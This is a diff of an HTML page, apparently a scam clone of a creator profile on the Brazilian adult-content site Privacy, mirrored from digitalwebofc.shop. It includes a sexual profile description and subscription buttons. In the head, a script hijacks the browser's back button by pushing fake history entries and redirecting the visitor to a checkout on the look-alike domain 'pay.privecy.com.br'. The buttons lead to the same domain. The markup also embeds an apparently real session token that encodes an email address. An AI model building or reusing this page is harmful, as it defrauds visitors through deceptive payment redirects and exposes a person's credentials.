@@ -1,869 +1,1017 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <!-- Mirrored from digitalwebofc.shop/kamilinhapriv/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Mar 2025 13:02:56 GMT -->
 <style>
-        .pulsante {
-            display: inline-block;
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-             border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            animation: pulse 1.5s infinite;
-        }
-        
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.1);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-        /* Impede que o conteúdo vá para os lados */
-        html, body {
-              overflow-x: hidden; /* Impede scroll horizontal */
-              overflow-y: auto; /* Garante que o scroll vertical funcione */
-              margin: 0;
-              padding: 0;
-              width: 100%;
-              box-sizing: border-box;
-              height: 100%;
-        }
-		.live-indicator {
-		    	position: relative;
-				display: inline-block;
-				padding: 5px; /* Space for border effect */
-				border-radius: 50%;
-				border: 4px solid red; /* Borda vermelha */
-				box-shadow: 0 0 10px rgba(255, 0, 0, 0.8); /* Efeito de brilho */
-		}
-							
-		.live-indicator .avatar {
-				display: block;
-		}
-							
-		.live-badge {
-				position: absolute;
-				bottom: -10px; /* Posiciona abaixo da imagem */
-				right: 0;
-				background-color: red;
-				color: white;
-				font-size: 10px;
-				font-weight: bold;
-				text-transform: uppercase;
-				padding: 4px 8px;
-				border-radius: 20px;
-				box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3); /*Sombra para destaque */
-		}
-        </style>
-        
-        
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <meta http-equiv="x-ua-compatible" content="ie=edge">
-        <meta name="robots" content="index, follow">
-         <meta property="og:title" content="Privacy">
-        <meta property="og:locale" content="pt_BR">
-        <meta property="og:description" content="Privacidade & Liberdade.">
-        <meta property="og:image" content="https://privacy.com.br/assets/img/logo/logo_colorido.jpg">
-        <meta name="kdt:page" content="profile">
-        <title> Privacy | Carolzinha </title>
-        <link rel="icon" type="image/png" href="../../privacy.com.br/assets/img/logo/logo.html">
-        <link rel="apple-touch-icon" sizes="128x128" href="../../privacy.com.br/assets/img/logo/logo.html">
-        <link rel="icon" sizes="192x192" href="../../privacy.com.br/assets/img/logo/logo.html">
-        <link rel="stylesheet" href="css/fontisto-brands.min.css">
-        <link rel="stylesheet" href="css/all.min.css">
-        <link rel="stylesheet" href="css/bulma.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
-        <link rel="stylesheet" href="css/app.css">
-        <link rel="stylesheet" href="css/core.css">
-        <link rel="stylesheet" href="css/bootstrap.min2.css" crossorigin="anonymous" referrerpolicy="no-referrer">
-        <link rel="stylesheet" href="css/privacy3.css">
-        <link rel="stylesheet" href="css/index.min.css">
-        <link rel="stylesheet" href="css/privacy.components.css">
-        <link rel="stylesheet" href="css/balloon.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
-        <link rel="stylesheet" href="css/jquery.fancybox.min.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/blueimp-gallery.min.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/slick.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/slick-theme.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/video-js.min.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/photoswipe.min.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/privacy.components.skeleton.css" crossorigin="anonymous">
-        <link rel="stylesheet" href="css/perfil.css">
-        <link rel="stylesheet" href="css/pagamento.css">
-        <link rel="stylesheet" href="css/profile.css">
-        
-        
+    .pulsante {
+        display: inline-block;
+        padding: 10px 20px;
+        font-size: 16px;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        animation: pulse 1.5s infinite;
+    }
 
-        <script>
-        // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
-        const link = 'https://pay.privecy.com.br/checkout/2985a976-e091-4962-a8ca-c61e446f8387';
-    
-        function setBackRedirect(url) {
+
+    @keyframes pulse {
+        0% {
+            transform: scale(1);
+        }
+
+        50% {
+            transform: scale(1.1);
+        }
+
+        100% {
+            transform: scale(1);
+        }
+    }
+
+    /* Impede que o conteúdo vá para os lados */
+    html,
+    body {
+        overflow-x: hidden;
+        /* Impede scroll horizontal */
+        overflow-y: auto;
+        /* Garante que o scroll vertical funcione */
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        box-sizing: border-box;
+        height: 100%;
+    }
+
+    .live-indicator {
+        position: relative;
+        display: inline-block;
+        padding: 5px;
+        /* Space for border effect */
+        border-radius: 50%;
+        border: 4px solid red;
+        /* Borda vermelha */
+        box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
+        /* Efeito de brilho */
+    }
+
+    .live-indicator .avatar {
+        display: block;
+    }
+
+    .live-badge {
+        position: absolute;
+        bottom: -10px;
+        /* Posiciona abaixo da imagem */
+        right: 0;
+        background-color: red;
+        color: white;
+        font-size: 10px;
+        font-weight: bold;
+        text-transform: uppercase;
+        padding: 4px 8px;
+        border-radius: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        /*Sombra para destaque */
+    }
+</style>
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="Privacy">
+<meta property="og:locale" content="pt_BR">
+<meta property="og:description" content="Privacidade & Liberdade.">
+<meta property="og:image" content="https://privacy.com.br/assets/img/logo/logo_colorido.jpg">
+<meta name="kdt:page" content="profile">
+<title> Privacy | Carolzinha </title>
+<link rel="icon" type="image/png" href="../../privacy.com.br/assets/img/logo/logo.html">
+<link rel="apple-touch-icon" sizes="128x128" href="../../privacy.com.br/assets/img/logo/logo.html">
+<link rel="icon" sizes="192x192" href="../../privacy.com.br/assets/img/logo/logo.html">
+<link rel="stylesheet" href="css/fontisto-brands.min.css">
+<link rel="stylesheet" href="css/all.min.css">
+<link rel="stylesheet" href="css/bulma.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link rel="stylesheet" href="css/app.css">
+<link rel="stylesheet" href="css/core.css">
+<link rel="stylesheet" href="css/bootstrap.min2.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link rel="stylesheet" href="css/privacy3.css">
+<link rel="stylesheet" href="css/index.min.css">
+<link rel="stylesheet" href="css/privacy.components.css">
+<link rel="stylesheet" href="css/balloon.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link rel="stylesheet" href="css/jquery.fancybox.min.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/blueimp-gallery.min.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/slick.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/slick-theme.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/video-js.min.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/photoswipe.min.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/privacy.components.skeleton.css" crossorigin="anonymous">
+<link rel="stylesheet" href="css/perfil.css">
+<link rel="stylesheet" href="css/pagamento.css">
+<link rel="stylesheet" href="css/profile.css">
+
+
+
+<script>
+    // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+    const link = 'https://pay.privecy.com.br/checkout/2985a976-e091-4962-a8ca-c61e446f8387';
+
+    function setBackRedirect(url) {
         let urlBackRedirect = url;
         urlBackRedirect = urlBackRedirect =
-          urlBackRedirect.trim() +
-          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-          document.location.search.replace('?', '').toString();
-    
+            urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+
         history.pushState({}, '', location.href);
         history.pushState({}, '', location.href);
         history.pushState({}, '', location.href);
-    
+
         window.addEventListener('popstate', () => {
-          console.log('onpopstate', urlBackRedirect);
-          setTimeout(() => {
-            location.href = urlBackRedirect;
-          }, 1);
+            console.log('onpopstate', urlBackRedirect);
+            setTimeout(() => {
+                location.href = urlBackRedirect;
+            }, 1);
         });
-      }
-    
-      setBackRedirect(link);
-        </script>
-        
-        <script>
-        function redirecionar1() {
-            window.location.href= 'https://pay.privecy.com.br/checkout/2985a976-e091-4962-a8ca-c61e446f8387' + window.location.search;
-        }
-        function redirecionar2() {
-            window.location.href= 'https://pay.privecy.com.br/checkout/094ee7f5-77d9-46b2-9160-a5bc3dfddd3c' + window.location.search;
-        }
-        function redirecionar3() {
-            window.location.href= 'https://pay.privecy.com.br/checkout/11787ad1-5c2a-4dcd-90e7-044f96da4d39' + window.location.search;
-        }
-        </script>
-    
-     
-         
-         </head><body><div id="loadProgress" style="position: fixed; background-color: white; top: 0; right: 0; bottom: 0; left: 0; z-index: 999999999999; display: none;">
-            <p id="progressBar" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
-                <progress style="width: 300px; height: 100px; vertical-align: middle;" value="0" max="100"></progress> <span style="font-size: 30px; font-weight: bold;">0%</span>
-            </p>
-        </div>
-        <div class="pageloader"><img src="images/logo.svg" alt=""></div>
-        <div class="infraloader"></div>
-        <div class="app-overlay"></div>
-        <div id="app-teleport"></div> 
-         <!-- Desktop Navbar -->
-        <div id="main-navbar" class="navbar isl-inline-flex is-transparent is-hidden-mobile no-shadow" style="z-index:1000">
-            <div class="container is-fluid">
-                <div class="navbar-brand">
-                    <a class="navbar-item">
-                        <img src="images/logo.svg" width="112" height="28" style="margin-top: 20px; margin-left:19px" alt="">
-                    </a>
-                </div>
-                <div class="navbar-menu">
-                    <div class="navbar-start">
-                    </div>
-                    <div class="navbar-end">
-                         
-                        <!-- MENSAGENS -->
-                        <div class="navbar-item is-icon">
-                            <a class="icon-link" href="index.html#">
-                                <div>
-                                    <privacy-web-chatnotifier app-settings="eyJFTkRQT0lOVF9BUElfQ0hBVCI6Imh0dHBzOi8vc2VydmljZS5wcml2YWN5LmNvbS5ici9jaGF0IiwiRU5EUE9JTlRfQVBJX0NIQVRfV1MiOiJ3c3M6Ly9zZXJ2aWNlLXdlYnNvY2tldC5wcml2YWN5LmNvbS5ici9jaGF0IiwiUFJJVkFDWV9VUkwiOiJodHRwczovL3ByaXZhY3kuY29tLmJyIiwiUFJJVkFDWV9NT0RVTEVTIjoiaHR0cHM6Ly9tb2R1bGVzLnByaXZhY3kuY29tLmJyIn0=" token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI4NmFhMjYyYy0wZmY0LTQwYzYtYjFiOS0xMGY4ODBiZmE1YjUiLCJlbWFpbCI6ImNvbnRhdG8ucmhkQGdtYWlsLmNvbSIsInVpZCI6IjQyNzMyOTYiLCJhaWQiOiI3ODFhNmM2MC01YTZmLTRjZDUtOWM4My1iZDFhZTgwOGFjZmUiLCJjb3VudHJ5IjoiQlIiLCJpYXQiOjE3MzA5ODM4NzMsInByb2ZpbGVfbmFtZSI6Ijc4MUE2QzYwLTVBNkYtNENENS05QzgzLUJEMUFFODA4QUNGRSIsInJvbGUiOiJDbGllbnQiLCJleHAiOjE3MzEwMDU1MzIsImlzcyI6IlByaXZhY3kifQ.2GxtiHVdRC5nrOaZMiU8HdEvqS3wpm87e6p9b-g3ouI" enabled-push-notification="enabled-push-notification" alert-width="16" alert-height="15" top="14" right="4" stop-connection-if-hidden="true">
-                                        <div style="display: flex; align-items: center; justify-content: center;" slot="icon-content">
-                                            <img src="images/Chat.svg">
-                                        </div>
-                                    </privacy-web-chatnotifier>
-                                </div>
-     
-                            </a>
-                        </div>
-                         
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- Tablet Navbar -->
-        <nav class="d-block navbar mobile-navbar is-hidden-desktop is-hidden-mobile no-shadow" aria-label="main navigation" style="z-index:1000">
-            <div class="d-block navbar-brand" style="padding-bottom: 0.6rem">
-                <a class="d-inline-flex navbar-item-logo">
-                    <img src="images/logo_mobile.svg" style="max-height: 50px; max-width: 50px; height: 37px; animation: none;" alt="">
+    }
+
+    setBackRedirect(link);
+</script>
+
+<script>
+    function redirecionar1() {
+        window.location.href = 'https://pay.privecy.com.br/checkout/2985a976-e091-4962-a8ca-c61e446f8387' + window.location.search;
+    }
+    function redirecionar2() {
+        window.location.href = 'https://pay.privecy.com.br/checkout/094ee7f5-77d9-46b2-9160-a5bc3dfddd3c' + window.location.search;
+    }
+    function redirecionar3() {
+        window.location.href = 'https://pay.privecy.com.br/checkout/11787ad1-5c2a-4dcd-90e7-044f96da4d39' + window.location.search;
+    }
+</script>
+
+
+
+</head>
+
+<body>
+    <div id="loadProgress"
+        style="position: fixed; background-color: white; top: 0; right: 0; bottom: 0; left: 0; z-index: 999999999999; display: none;">
+        <p id="progressBar" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
+            <progress style="width: 300px; height: 100px; vertical-align: middle;" value="0" max="100"></progress> <span
+                style="font-size: 30px; font-weight: bold;">0%</span>
+        </p>
+    </div>
+    <div class="pageloader"><img src="images/logo.svg" alt=""></div>
+    <div class="infraloader"></div>
+    <div class="app-overlay"></div>
+    <div id="app-teleport"></div>
+    <!-- Desktop Navbar -->
+    <div id="main-navbar" class="navbar isl-inline-flex is-transparent is-hidden-mobile no-shadow" style="z-index:1000">
+        <div class="container is-fluid">
+            <div class="navbar-brand">
+                <a class="navbar-item">
+                    <img src="images/logo.svg" width="112" height="28" style="margin-top: 20px; margin-left:19px"
+                        alt="">
                 </a>
-                <div class="align-self-end d-inline-flex float-right">
-                     
-                     
+            </div>
+            <div class="navbar-menu">
+                <div class="navbar-start">
+                </div>
+                <div class="navbar-end">
+
+                    <!-- MENSAGENS -->
                     <div class="navbar-item is-icon">
                         <a class="icon-link" href="index.html#">
                             <div>
-                                <privacy-web-chatnotifier app-settings="eyJFTkRQT0lOVF9BUElfQ0hBVCI6Imh0dHBzOi8vc2VydmljZS5wcml2YWN5LmNvbS5ici9jaGF0IiwiRU5EUE9JTlRfQVBJX0NIQVRfV1MiOiJ3c3M6Ly9zZXJ2aWNlLXdlYnNvY2tldC5wcml2YWN5LmNvbS5ici9jaGF0IiwiUFJJVkFDWV9VUkwiOiJodHRwczovL3ByaXZhY3kuY29tLmJyIiwiUFJJVkFDWV9NT0RVTEVTIjoiaHR0cHM6Ly9tb2R1bGVzLnByaXZhY3kuY29tLmJyIn0=" token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI4NmFhMjYyYy0wZmY0LTQwYzYtYjFiOS0xMGY4ODBiZmE1YjUiLCJlbWFpbCI6ImNvbnRhdG8ucmhkQGdtYWlsLmNvbSIsInVpZCI6IjQyNzMyOTYiLCJhaWQiOiI3ODFhNmM2MC01YTZmLTRjZDUtOWM4My1iZDFhZTgwOGFjZmUiLCJjb3VudHJ5IjoiQlIiLCJpYXQiOjE3MzA5ODM4NzMsInByb2ZpbGVfbmFtZSI6Ijc4MUE2QzYwLTVBNkYtNENENS05QzgzLUJEMUFFODA4QUNGRSIsInJvbGUiOiJDbGllbnQiLCJleHAiOjE3MzEwMDU1MzIsImlzcyI6IlByaXZhY3kifQ.2GxtiHVdRC5nrOaZMiU8HdEvqS3wpm87e6p9b-g3ouI" enabled-push-notification="enabled-push-notification" alert-width="16" alert-height="15" top="14" right="4" stop-connection-if-hidden="true">
-                                    <div style="display: flex; align-items: center; justify-content: center;" slot="icon-content">
+                                <privacy-web-chatnotifier
+                                    app-settings="eyJFTkRQT0lOVF9BUElfQ0hBVCI6Imh0dHBzOi8vc2VydmljZS5wcml2YWN5LmNvbS5ici9jaGF0IiwiRU5EUE9JTlRfQVBJX0NIQVRfV1MiOiJ3c3M6Ly9zZXJ2aWNlLXdlYnNvY2tldC5wcml2YWN5LmNvbS5ici9jaGF0IiwiUFJJVkFDWV9VUkwiOiJodHRwczovL3ByaXZhY3kuY29tLmJyIiwiUFJJVkFDWV9NT0RVTEVTIjoiaHR0cHM6Ly9tb2R1bGVzLnByaXZhY3kuY29tLmJyIn0="
+                                    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI4NmFhMjYyYy0wZmY0LTQwYzYtYjFiOS0xMGY4ODBiZmE1YjUiLCJlbWFpbCI6ImNvbnRhdG8ucmhkQGdtYWlsLmNvbSIsInVpZCI6IjQyNzMyOTYiLCJhaWQiOiI3ODFhNmM2MC01YTZmLTRjZDUtOWM4My1iZDFhZTgwOGFjZmUiLCJjb3VudHJ5IjoiQlIiLCJpYXQiOjE3MzA5ODM4NzMsInByb2ZpbGVfbmFtZSI6Ijc4MUE2QzYwLTVBNkYtNENENS05QzgzLUJEMUFFODA4QUNGRSIsInJvbGUiOiJDbGllbnQiLCJleHAiOjE3MzEwMDU1MzIsImlzcyI6IlByaXZhY3kifQ.2GxtiHVdRC5nrOaZMiU8HdEvqS3wpm87e6p9b-g3ouI"
+                                    enabled-push-notification="enabled-push-notification" alert-width="16"
+                                    alert-height="15" top="14" right="4" stop-connection-if-hidden="true">
+                                    <div style="display: flex; align-items: center; justify-content: center;"
+                                        slot="icon-content">
                                         <img src="images/Chat.svg">
                                     </div>
                                 </privacy-web-chatnotifier>
                             </div>
-                     
+
                         </a>
                     </div>
-                     
+
                 </div>
             </div>
-        </nav>
-        <!-- Phone Navbar -->
-        <nav id="mobile-navbar" class="d-block navbar mobile-navbar is-hidden-desktop is-hidden-tablet animate no-shadow" aria-label="main navigation" style="z-index:1000">
-            <div class="d-block navbar-brand" style="padding-bottom: 0.6rem">
-                <a class="d-inline-flex navbar-item-logo">
-                    <img src="images/logo_mobile.svg" style="max-height: 50px; max-width: 50px; height: 37px; animation: none;" alt="">
-                </a>
-                <div class="align-self-end d-inline-flex float-right">
-                     
+        </div>
+    </div>
+    <!-- Tablet Navbar -->
+    <nav class="d-block navbar mobile-navbar is-hidden-desktop is-hidden-mobile no-shadow" aria-label="main navigation"
+        style="z-index:1000">
+        <div class="d-block navbar-brand" style="padding-bottom: 0.6rem">
+            <a class="d-inline-flex navbar-item-logo">
+                <img src="images/logo_mobile.svg"
+                    style="max-height: 50px; max-width: 50px; height: 37px; animation: none;" alt="">
+            </a>
+            <div class="align-self-end d-inline-flex float-right">
+
+
+                <div class="navbar-item is-icon">
+                    <a class="icon-link" href="index.html#">
+                        <div>
+                            <privacy-web-chatnotifier
+                                app-settings="eyJFTkRQT0lOVF9BUElfQ0hBVCI6Imh0dHBzOi8vc2VydmljZS5wcml2YWN5LmNvbS5ici9jaGF0IiwiRU5EUE9JTlRfQVBJX0NIQVRfV1MiOiJ3c3M6Ly9zZXJ2aWNlLXdlYnNvY2tldC5wcml2YWN5LmNvbS5ici9jaGF0IiwiUFJJVkFDWV9VUkwiOiJodHRwczovL3ByaXZhY3kuY29tLmJyIiwiUFJJVkFDWV9NT0RVTEVTIjoiaHR0cHM6Ly9tb2R1bGVzLnByaXZhY3kuY29tLmJyIn0="
+                                token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI4NmFhMjYyYy0wZmY0LTQwYzYtYjFiOS0xMGY4ODBiZmE1YjUiLCJlbWFpbCI6ImNvbnRhdG8ucmhkQGdtYWlsLmNvbSIsInVpZCI6IjQyNzMyOTYiLCJhaWQiOiI3ODFhNmM2MC01YTZmLTRjZDUtOWM4My1iZDFhZTgwOGFjZmUiLCJjb3VudHJ5IjoiQlIiLCJpYXQiOjE3MzA5ODM4NzMsInByb2ZpbGVfbmFtZSI6Ijc4MUE2QzYwLTVBNkYtNENENS05QzgzLUJEMUFFODA4QUNGRSIsInJvbGUiOiJDbGllbnQiLCJleHAiOjE3MzEwMDU1MzIsImlzcyI6IlByaXZhY3kifQ.2GxtiHVdRC5nrOaZMiU8HdEvqS3wpm87e6p9b-g3ouI"
+                                enabled-push-notification="enabled-push-notification" alert-width="16" alert-height="15"
+                                top="14" right="4" stop-connection-if-hidden="true">
+                                <div style="display: flex; align-items: center; justify-content: center;"
+                                    slot="icon-content">
+                                    <img src="images/Chat.svg">
+                                </div>
+                            </privacy-web-chatnotifier>
+                        </div>
+
+                    </a>
                 </div>
+
             </div>
-        </nav>
-        <div class="nav-drop-overlay" id="nav-drop-overlay"></div>
-        <div class="container-inner view-wrapper">
-            <!-- Container -->
-            <input type="hidden" id="ClienteId" value="d7391a4c-2ef8-4df3-b156-6b834aca71f3">
-            <input type="hidden" id="nomePerfil" name="nomePerfil" value="kerolaychaves">
-            <input type="hidden" id="filterMosaico" name="filterMosaico" value="">
-            <input type="hidden" id="MensagemBume">
-            <input type="hidden" id="Mensagem">
-            <input type="hidden" id="SilenciarPerfilId" name="SilenciarPerfilId" value="">
-            <div class="scroll-x-hidden-mobile-mosaic">
-                <div class="container">
-                    <div class="background-custom-size bg-img-styles justify-content-end media overflow-hidden row" style="background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.9), transparent), url('https://res.cloudinary.com/ddcecxeoi/image/upload/v1760199697/2830690643455402345_37549664947_4_wmnwgx.jpg');">
-                        <div class="align-self-end mb-n3 pb-1 order-last">
-                            <ul class="mr-4 row">
-                                <li>
-                                    <strong class="profile-numbers ml-2">
-                                        <span class="text-light text-counts-profile"> 744 posts </span>
-                                    </strong>
-                                </li>
-                                <li><strong class="profile-numbers ml-2"><span class="text-light text-counts-profile">•</span></strong></li>
-                                <li>
-                                    <strong class="profile-numbers ml-2">
-                                        <span class="text-light text-counts-profile"> 370k likes </span>
-                                    </strong>
-                                </li>
-                            </ul>
+        </div>
+    </nav>
+    <!-- Phone Navbar -->
+    <nav id="mobile-navbar" class="d-block navbar mobile-navbar is-hidden-desktop is-hidden-tablet animate no-shadow"
+        aria-label="main navigation" style="z-index:1000">
+        <div class="d-block navbar-brand" style="padding-bottom: 0.6rem">
+            <a class="d-inline-flex navbar-item-logo">
+                <img src="images/logo_mobile.svg"
+                    style="max-height: 50px; max-width: 50px; height: 37px; animation: none;" alt="">
+            </a>
+            <div class="align-self-end d-inline-flex float-right">
+
+            </div>
+        </div>
+    </nav>
+    <div class="nav-drop-overlay" id="nav-drop-overlay"></div>
+    <div class="container-inner view-wrapper">
+        <!-- Container -->
+        <input type="hidden" id="ClienteId" value="d7391a4c-2ef8-4df3-b156-6b834aca71f3">
+        <input type="hidden" id="nomePerfil" name="nomePerfil" value="kerolaychaves">
+        <input type="hidden" id="filterMosaico" name="filterMosaico" value="">
+        <input type="hidden" id="MensagemBume">
+        <input type="hidden" id="Mensagem">
+        <input type="hidden" id="SilenciarPerfilId" name="SilenciarPerfilId" value="">
+        <div class="scroll-x-hidden-mobile-mosaic">
+            <div class="container">
+                <div class="background-custom-size bg-img-styles justify-content-end media overflow-hidden row"
+                    style="background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.9), transparent), url('https://res.cloudinary.com/ddcecxeoi/image/upload/v1760199697/2830690643455402345_37549664947_4_wmnwgx.jpg');">
+                    <div class="align-self-end mb-n3 pb-1 order-last">
+                        <ul class="mr-4 row">
+                            <li>
+                                <strong class="profile-numbers ml-2">
+                                    <span class="text-light text-counts-profile"> 744 posts </span>
+                                </strong>
+                            </li>
+                            <li><strong class="profile-numbers ml-2"><span
+                                        class="text-light text-counts-profile">•</span></strong></li>
+                            <li>
+                                <strong class="profile-numbers ml-2">
+                                    <span class="text-light text-counts-profile"> 370k likes </span>
+                                </strong>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="pl-3 pr-4 row">
+                    <div class="user-img mt-n5 mr-1">
+                        <div style="left:-4px;top:-4px;">
+                            <div>
+                                <figure class="d-inline-block bg-img-profile live-indicator">
+                                    <img class="avatar rounded-circle"
+                                        src="https://res.cloudinary.com/ddcecxeoi/image/upload/v1760199961/3470928088060661975_37549664947_5_lwbvx6.jpg"
+                                        id="FotoPerfil" style="max-width:96px;min-height:96px;min-width:96px;">
+                                    <div class="border-profile"></div>
+                                    <span class="live-badge">AO VIVO</span>
+                                </figure>
+                            </div>
                         </div>
                     </div>
-                    <div class="pl-3 pr-4 row">
-                        <div class="user-img mt-n5 mr-1">
-                            <div style="left:-4px;top:-4px;">
-                                <div>
-                                    <figure class="d-inline-block bg-img-profile live-indicator">
-									<img class="avatar rounded-circle" src="https://res.cloudinary.com/ddcecxeoi/image/upload/v1760199961/3470928088060661975_37549664947_5_lwbvx6.jpg" id="FotoPerfil" style="max-width:96px;min-height:96px;min-width:96px;">
-									<div class="border-profile"></div>
-									<span class="live-badge">AO VIVO</span>
-								</figure>
+                    <div class="px-1 flex-column align-items-start d-flex justify-content-center">
+                        <div class="align-items-center d-flex mb-n2  user-title">
+                            <div class="d-inline-block word-clamp-40 mb-0 mr-1">
+                                <div class="d-inline-block word-clamp-40">
+                                    <h5 class="d-inline-block item-title mb-0 mr-1 word-clamp-40 text-profile-one">
+                                        CarolBratz</h5>
                                 </div>
                             </div>
-                        </div>
-                        <div class="px-1 flex-column align-items-start d-flex justify-content-center">
-                            <div class="align-items-center d-flex mb-n2  user-title">
-                                <div class="d-inline-block word-clamp-40 mb-0 mr-1">
-                                    <div class="d-inline-block word-clamp-40">
-                                        <h5 class="d-inline-block item-title mb-0 mr-1 word-clamp-40 text-profile-one">CarolBratz</h5>
-                                    </div>
-                                </div>
-                                <div>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="orange" class="bi bi-check-all" viewBox="0 0 16 16">
-                                <path d="M8.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L2.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093L8.95 4.992zm-.92 5.14.92.92a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 1 0-1.091-1.028L9.477 9.417l-.485-.486z"></path>
-                                </svg>							</div>
+                            <div>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="orange"
+                                    class="bi bi-check-all" viewBox="0 0 16 16">
+                                    <path
+                                        d="M8.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L2.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093L8.95 4.992zm-.92 5.14.92.92a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 1 0-1.091-1.028L9.477 9.417l-.485-.486z">
+                                    </path>
+                                </svg>
                             </div>
-                            <ul class="entry-meta menu-z-index">
-                                <li class="meta-privacy text-muted d-inline-block position-relative">
-                                    <div class="mt-1  mb-2 word-clamp-40">
-                                        <h6 class="text-nprofile text-ellipsis item-title mb-2 mt-0 word-clamp-40 text-profile-two "> @CarolBratz </h6>
-                                    </div>
-                                </li>
-                            </ul>
                         </div>
-                     
+                        <ul class="entry-meta menu-z-index">
+                            <li class="meta-privacy text-muted d-inline-block position-relative">
+                                <div class="mt-1  mb-2 word-clamp-40">
+                                    <h6
+                                        class="text-nprofile text-ellipsis item-title mb-2 mt-0 word-clamp-40 text-profile-two ">
+                                        @CarolBratz </h6>
+                                </div>
+                            </li>
+                        </ul>
                     </div>
-                    <div class="row">
-                        <div class="col-12 mb-n2 profile-description" style="margin-top: 25px;">
-                            <input type="checkbox" class="read-more-checker" id="read-more-checker">
-                            <div class="limited l-200">
-                                <p class="margin-left-14">Oi meu bem! Sou a Carol Bratz💋, você já deve me conhecer das redes sociais, agora é a hora de conhecer o meu lado mais malvadinha rsrs! Aqui no meu perfil você vai ter acesso à cenas picantes feitas por mim sozinha e acompanhada, espero que se divirta😈!</p>
-                                <div class="bottom"></div>
-                            </div>
-                            <label for="read-more-checker" class="view-more-button text-muted pl-3"></label>
-                    <div class="pl-3 pr-2 row">
-                        <div class="col-12">
+
+                </div>
+                <div class="row">
+                    <div class="col-12 mb-n2 profile-description" style="margin-top: 25px;">
+                        <input type="checkbox" class="read-more-checker" id="read-more-checker">
+                        <div class="limited l-200">
+                            <p class="margin-left-14">Oi meu bem! Sou a Carol Bratz💋, você já deve me conhecer das
+                                redes sociais, agora é a hora de conhecer o meu lado mais malvadinha rsrs! Aqui no meu
+                                perfil você vai ter acesso à cenas picantes feitas por mim sozinha e acompanhada, espero
+                                que se divirta😈!</p>
+                            <div class="bottom"></div>
+                        </div>
+                        <label for="read-more-checker" class="view-more-button text-muted pl-3"></label>
+                        <div class="pl-3 pr-2 row">
+                            <div class="col-12">
                             </div>
                             <div class="row">
                                 <div class="col-12 is-multiline">
                                     <div class="settings-panel">
-                                <h6 class="text-center font-weight-bold mb-4">
-                                ASSINE AGORA</h6></div>
-        <!-- Plano 7 dias -->
-        <div class="col-12 mb-3">
-            <button onclick="redirecionar1()" class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento" style="border-width: 2px; background-color: #ffa500; color: #fff;">
-                <span class="float-left ml-2"> Assinar (30 dias) </span>
-                <span class="float-right mr-2"> R$ 24,90</span>
-            </button>
-        </div>
-    
-        <!-- Plano 1 mês -->
-        <div class="col-12 mb-3">
-            <button onclick="redirecionar2()" class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento" style="border-width: 2px; background-color: #ffa500; color: #fff;">
-                <span class="float-left ml-2"> Assinar (60 dias) </span>
-                <span class="float-right mr-2"> R$ 39,90 </span>
-            </button>
-        </div>
-    
-        <!-- Plano 3 meses -->
-        <div class="col-12">
